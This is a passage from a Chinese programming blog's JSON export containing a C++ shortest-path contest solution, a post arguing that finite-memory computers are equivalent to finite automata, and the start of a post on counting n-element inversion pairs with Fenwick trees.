__dfs(END, isLength);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dp[f] &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dp[f];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> result = INF;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(t[i]==f)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dpVisit[t[i]])  <span class=\"comment\">// 代表该节点在这条路径上已经被访问过</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> p = __dfs(t[i], isLength) + (isLength ? <span class=\"number\">1</span> : length[t[i]][f]);</span><br><span class=\"line\">        dpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &lt; result) &#123;</span><br><span class=\"line\">            tpResult[f] = t[i];</span><br><span class=\"line\">            result = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    dp[f] = result;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> path[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> outpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span> </span>&#123;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (f == BEGIN) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"outp: \"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; index; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; path[i] &lt;&lt; <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        outpVisit[f] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    path[index] = f;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;t = tp[f];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; t.size(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (outpVisit[t[i]])<span class=\"comment\">// means that 前辈们已经访问过了，再访问就成环了</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        outp(t[i], index + <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    outpVisit[f] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","slug":"天梯L3-007-天梯地图","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"Dijstra最短路","slug":"Dijstra最短路","permalink":"https://h-zex.github.io/tags/Dijstra最短路/"},{"name":"天梯赛","slug":"天梯赛","permalink":"https://h-zex.github.io/tags/天梯赛/"}]},{"title":"有限存储的计算机等价于有限自动机（DFA、NFA）","date":"2018-05-11T08:13:18.000Z","path":"2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/","text":"$B=\\{0^n1^n|n\\ge0\\}$ Michael Sipser 的 Introduction to the Theory of Computation 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值 如果是n处于一定范围内，容易构造出一台DFA识别B： 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集 转移方程为 首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$ 然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$ 然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值 最后：一旦转移到 $&lt;n, n&gt;$ 就accept 为什么现实中的计算机有可能是DFA 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能 对任意一段代码构造等价的NFANFA构造方法描述 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个） 输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ 为什么该NFA只接受允许的字符串，而不会接受多余的字符串 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA 则最终的NFA只接受允许的字符串 是否会出现情况：代码两次处于某状态但是行为不一样 答案是肯定不会 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的 对任意一台计算机构造等价的DFA 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算 先说明一些前置情况： 现实中计算机使用源码处理特定的输入 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA 然后开始构造DFA 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个 DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合 计算机可以死循环，DFA不会死循环，为什么 consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变 而按照Introduction to the Theory of Computation 的1.2节的EQUIVALENCE OF NFAS AND DFASDFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）： $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了","raw":"---\ntitle: 有限存储的计算机等价于有限自动机（DFA、NFA）\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-11 16:13:18\ntags:\n- DFA\n- NFA\n- 有限自动机\n- 计算理论\ndescription: 区别于图灵机的无限纸带，现实的计算机只有有限存储，所以其不是TM，而是DFA/NFA\ncategories:\n- 计算理论\n\n---\n\n### $B=\\\\{0^n1^n|n\\ge0\\\\}$ \n\n- Michael Sipser 的 *Introduction to the Theory of Computation* 的1.4提到一个非正则语言的例子，$B=\\\\{0^n1^n|n\\ge0\\\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别\n- 但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢\n- 事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值\n- 如果是n处于一定范围内，容易构造出一台DFA识别B：\n  - 设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量\n  - 那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集\n  - 转移方程为\n    - 首先： $<0,0>\\rightarrow<1,0>\\rightarrow<2,0>\\rightarrow...\\rightarrow<1000,0>$\n    - 然后：从任意$<n,0>$ 都可以转移到 $<n,1>$\n    - 然后：一旦转移到 $<n,1>$ ，就不能转移到 $<n+k,m>, (k>0)$ ，也就是不能增长n的值\n    - 最后：一旦转移到 $<n, n>$ 就accept\n\n### 为什么现实中的计算机有可能是DFA\n\n- 计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能\n\n### 对任意一段代码构造等价的NFA\n\n##### NFA构造方法描述\n\n- 假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$<c1,c2,c3,c4,c5>$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）\n\n\n- 输入字符表是$\\\\{0,1\\\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。\n\n\n- 假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$<0,0,0,0,0>$ 就是起始态\n- 假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$<1,2,3,4,5>$ 就是该NFA的accept state\n- 该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$<d1,d2,d3,d4,d5>$ ，输入后处于 $<d6,d7,d8,d9,d10>$ ，则在从$<d1,d2,d3,d4,d5>$ 到 $<d6,d7,d8,d9,d10>$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ \n\n##### 为什么该NFA只接受允许的字符串，而不会接受多余的字符串\n\n- 首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串\n- 设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA\n- 则最终的NFA只接受允许的字符串\n\n##### 是否会出现情况：代码两次处于某状态但是行为不一样\n\n- 答案是肯定不会\n- 计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的\n\n### 对任意一台计算机构造等价的DFA\n\n- 对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算\n- 先说明一些前置情况：\n  - 现实中计算机使用源码处理特定的输入\n  - 把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M\n- 因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA\n- 然后开始构造DFA\n  - 该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个\n  - DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态\n  - 第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态\n- 从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合\n\n### 计算机可以死循环，DFA不会死循环，为什么\n\n- consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。\n\n\n- 因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。\n\n- 在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环\n\n- 截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变\n\n- 而按照*Introduction to the Theory of Computation* 的1.2节的*EQUIVALENCE OF NFAS AND DFAS*DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：\n\n  {% asset_img 1.png %}\n\n  $E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了\n\n","content":"<h3 id=\"B-0-n1-n-n-ge0\"><a href=\"#B-0-n1-n-n-ge0\" class=\"headerlink\" title=\"$B=\\{0^n1^n|n\\ge0\\}$\"></a>$B=\\{0^n1^n|n\\ge0\\}$</h3><ul>\n<li>Michael Sipser 的 <em>Introduction to the Theory of Computation</em> 的1.4提到一个非正则语言的例子，$B=\\{0^n1^n|n\\ge0\\}$ ，并用Pumping lemma证明了其是非正则的，无法被DFA识别</li>\n<li>但是我们的计算机似乎可以识别以上语言，所以，为什么我们的计算机还是DFA呢</li>\n<li>事实上，我们的计算机只能识别n处于一定范围的B，而不能识别n为任意值的B。如果n过大，我们的计算机的存储单元无法表达，则会发生溢出，导致识别了另一个语言 $C=\\{0^n1^m|n\\ mod\\ max=m\\ mod\\ max\\}$ ，其中，max是我们的计算机的存储单元可以表达的最大值</li>\n<li>如果是n处于一定范围内，容易构造出一台DFA识别B：<ul>\n<li>设有两个变量a、b，a、b都可以取值$[0,1000]$ ，a表示0的数量，b表示1的数量</li>\n<li>那么，a、b的所有笛卡尔积组成的集合的一个子集就是该DFA的状态集</li>\n<li>转移方程为<ul>\n<li>首先： $&lt;0,0&gt;\\rightarrow&lt;1,0&gt;\\rightarrow&lt;2,0&gt;\\rightarrow…\\rightarrow&lt;1000,0&gt;$</li>\n<li>然后：从任意$&lt;n,0&gt;$ 都可以转移到 $&lt;n,1&gt;$</li>\n<li>然后：一旦转移到 $&lt;n,1&gt;$ ，就不能转移到 $&lt;n+k,m&gt;, (k&gt;0)$ ，也就是不能增长n的值</li>\n<li>最后：一旦转移到 $&lt;n, n&gt;$ 就accept</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么现实中的计算机有可能是DFA\"><a href=\"#为什么现实中的计算机有可能是DFA\" class=\"headerlink\" title=\"为什么现实中的计算机有可能是DFA\"></a>为什么现实中的计算机有可能是DFA</h3><ul>\n<li>计算机只有有限存储，such as，某计算机有$2^{32}$ 个8bit的cell，每个cell有 $2^8$ 种取值，所以，所有存储的取值有 $(2^8)^{2^{32}}$ 种，也就是，这台计算机的存储只能有 $(2^8)^{2^{32}}$ 种状态，这就使得把计算机转为DFA变为可能</li>\n</ul>\n<h3 id=\"对任意一段代码构造等价的NFA\"><a href=\"#对任意一段代码构造等价的NFA\" class=\"headerlink\" title=\"对任意一段代码构造等价的NFA\"></a>对任意一段代码构造等价的NFA</h3><h5 id=\"NFA构造方法描述\"><a href=\"#NFA构造方法描述\" class=\"headerlink\" title=\"NFA构造方法描述\"></a>NFA构造方法描述</h5><ul>\n<li>假设该段代码的运行过程会改变的存储cell有c1、c2、c3、c4、c5，其中，c1到c5的取值范围都是[0,0xFF]，那么就可以构造$(2^8)^5$ 个$&lt;c1,c2,c3,c4,c5&gt;$ ，作为该NFA的状态集合。（注意，cs:ip 寄存器的值必然是这五个cell中的一个）</li>\n</ul>\n<ul>\n<li>输入字符表是$\\{0,1\\}$ ，将所有计算机接受的输入全部编码成bit 串后读入该DFA，每次读一个0或者一个1。</li>\n</ul>\n<ul>\n<li>假设该代码起始时，c1到c5的取值为$0,0,0,0,0$ ，则$&lt;0,0,0,0,0&gt;$ 就是起始态</li>\n<li>假设该段代码处于accept状态时，c1到c5的取值分别为$1,2,3,4,5$ ，那么，$&lt;1,2,3,4,5&gt;$ 就是该NFA的accept state</li>\n<li>该代码可以有输入，也可以无输入，可以在多个时候输入，也可以只在一个时候输入。假设其某次输入处于$&lt;d1,d2,d3,d4,d5&gt;$ ，输入后处于 $&lt;d6,d7,d8,d9,d10&gt;$ ，则在从$&lt;d1,d2,d3,d4,d5&gt;$ 到 $&lt;d6,d7,d8,d9,d10&gt;$ 是一个转移，转移使用的字符就是读入的字符。该代码也可以在无输入情况下由cpu作用，从一个状态转移到另一个状态，则在这两个状态之间使用$\\varepsilon$ </li>\n</ul>\n<h5 id=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"><a href=\"#为什么该NFA只接受允许的字符串，而不会接受多余的字符串\" class=\"headerlink\" title=\"为什么该NFA只接受允许的字符串，而不会接受多余的字符串\"></a>为什么该NFA只接受允许的字符串，而不会接受多余的字符串</h5><ul>\n<li>首先，可以使用以上方法对于每个接受的字符串都构造NFA，则该NFA只接受允许的那个字符串</li>\n<li>设置一个新的起始态，该起始态有$\\varepsilon$ 到所有为每个字符串构造的NFA</li>\n<li>则最终的NFA只接受允许的字符串</li>\n</ul>\n<h5 id=\"是否会出现情况：代码两次处于某状态但是行为不一样\"><a href=\"#是否会出现情况：代码两次处于某状态但是行为不一样\" class=\"headerlink\" title=\"是否会出现情况：代码两次处于某状态但是行为不一样\"></a>是否会出现情况：代码两次处于某状态但是行为不一样</h5><ul>\n<li>答案是肯定不会</li>\n<li>计算机的行为由当前状态决定——下一步要执行什么代码，取决于正在被执行的代码段，以及ip寄存器的值，如果text段的内容相同，cs:ip寄存器的相同，指令使用的值也相同，那么下一步的行为就是确定的</li>\n</ul>\n<h3 id=\"对任意一台计算机构造等价的DFA\"><a href=\"#对任意一台计算机构造等价的DFA\" class=\"headerlink\" title=\"对任意一台计算机构造等价的DFA\"></a>对任意一台计算机构造等价的DFA</h3><ul>\n<li>对于一台确定的计算机可以构造出确定的DFA，执行该计算机可以做的任何计算</li>\n<li>先说明一些前置情况：<ul>\n<li>现实中计算机使用源码处理特定的输入</li>\n<li>把现实中计算机处理该输入的源码编码成确定长度（统一取最大长度M——M是该计算机可以存储的最长比特串长度，比如$2^{40}$比特）的字符串，每个字符表示一个指令——这个其实等价于把源码编译成机器码（每个机器指令由一样的长度的比特串表示），然后把这个比特串补全成统一长度M</li>\n</ul>\n</li>\n<li>因为源码是M比特长，所以最多有$2^M$ 种不同的源码，根据上文，可以为每种源码构造一个DFA</li>\n<li>然后开始构造DFA<ul>\n<li>该DFA分为两个部分：第一个部分解释输入的源码字符串，第二个部分实际运行输入的源码来跑输入的数据——即实际运行$2^M$ 个不同的DFA中的一个</li>\n<li>DFA第一个部分，其读入长度M的字符串（也就是源码），从而把该台DFA导向某个状态，这个状态是$2^M$ 个实际运行代码的DFA中的一个的起始态</li>\n<li>第二部分就是那$2^M$ 台DFA，其接受输入，并最终停在某个状态——accept态或者是其他状态</li>\n</ul>\n</li>\n<li>从而该DFA接受$\\cup A_i$ ，其中$A_i$ 是该计算机可以运行的任意一段代码接受的字符串集合</li>\n</ul>\n<h3 id=\"计算机可以死循环，DFA不会死循环，为什么\"><a href=\"#计算机可以死循环，DFA不会死循环，为什么\" class=\"headerlink\" title=\"计算机可以死循环，DFA不会死循环，为什么\"></a>计算机可以死循环，DFA不会死循环，为什么</h3><ul>\n<li>consider that，死循环指的是无输入情况下，不停机，而不是无限输入导致的不停机。</li>\n</ul>\n<ul>\n<li><p>因为计算机的状态是有限的，所以，如果计算机死循环，那么其必然会重复处于某个状态，进而导致行为的重复——因为计算机的当前状态唯一确定了以后的行为。</p>\n</li>\n<li><p>在NFA，这种情况死循环的状况也会发生——一组状态以$\\varepsilon$ 连接在一起形成环，从而导致无限读入$\\varepsilon$ ，无限循环</p>\n</li>\n<li><p>截断导致NFA死循环的那个环，并不会影响接受的语言。假设该环是s1、s2、s3、s1，那么我们可以把其变成三条路：“s1、s2、s3”，“s2、s3、s1”，“s3、s1、s2” ，非形式化来说，因为这不会改变该图的连通性，所以接受的字符串集合不变</p>\n</li>\n<li><p>而按照<em>Introduction to the Theory of Computation</em> 的1.2节的<em>EQUIVALENCE OF NFAS AND DFAS</em>DFA 描述的方法，其正是去掉了这种$\\varepsilon$ 环，所以不会死循环，具体去掉的方法如下（截图来自书本英文第三版P56）：</p>\n<img src=\"/2018/05/11/有限存储的计算机等价于有限自动机（DFA、NFA）/1.png\">\n<p>$E(R)$ 是一个集合，集合中元素不重复，而$\\varepsilon$ 环所到达的状态必然是重复的，所以就把$\\varepsilon$ 环断开了</p>\n</li>\n</ul>\n","slug":"有限存储的计算机等价于有限自动机（DFA、NFA）","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"DFA","slug":"DFA","permalink":"https://h-zex.github.io/tags/DFA/"},{"name":"NFA","slug":"NFA","permalink":"https://h-zex.github.io/tags/NFA/"},{"name":"有限自动机","slug":"有限自动机","permalink":"https://h-zex.github.io/tags/有限自动机/"},{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/tags/计算理论/"}]},{"title":"n元逆序对数量求解","date":"2018-03-19T16:05:01.000Z","path":"2018/03/20/n元逆序对数量求解/","text":"以下思路都是针对从小到大排序的序列的逆序对 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n] 首先看看如何求二元逆序对 从左到右扫描序列，对于序列中位置为i的值x，flag[x]+=1 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i] 那么result的数组的和就是逆序对的数量 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n]; 同样扫描序列，对于位置为i的数x，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量 求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中 到最后，result_3就是结果 更多元组的也如此思路 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对 对于n元逆序对，同理，数组记录了当前已有的数x作为最后一个元素是x的n-1元逆序对的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与比他大的数代表的n-1元逆序对形成了更长的逆序对 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第i位的值是x） 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）","raw":"---\ntitle: n元逆序对数量求解\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-03-20 00:05:01\ntags:\n- 算法\n- 树状数组\ndescription: n元逆序对数量求解并利用树状数组优化\ncategories:\n- 算法\n---\n\n> 以下思路都是针对从小到大排序的序列的逆序对\n\n- 首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i>x_{i+1}>x_{i+2}>...$那么就是逆序对\n- 主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量\n- 假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]\n- 首先看看如何求二元逆序对\n   - 从左到右扫描序列，对于序列中位置为`i`的值`x`，flag[x]+=1\n   - 然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]\n   - 那么result的数组的和就是逆序对的数量\n   - 同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对\n- 三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result\\_2数组)，此时设另外的两个数组int flag\\_3[MAX+1], int result_3[n];\n   - 同样扫描序列，对于位置为`i`的数`x`，取出result\\_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag\\_3[x]记录了截止目前，以x结尾的二元组逆序对的数量\n   - 求$\\sum_{j=x+1}^{MAX}flag\\_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中\n   - 到最后，result_3就是结果\n- 更多元组的也如此思路\n- 这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对\n- 对于n元逆序对，同理，数组记录了当前已有的数`x`作为`最后一个元素是x的n-1元逆序对`的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与`比他大的数代表的n-1元逆序对`形成了更长的逆序对\n- 然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第`i`位的值是`x`）\n\n> 3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）\n","content":"<blockquote>\n<p>以下思路都是针对从小到大排序的序列的逆序对</p>\n</blockquote>\n<ul>\n<li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li>\n<li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li>\n<li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int 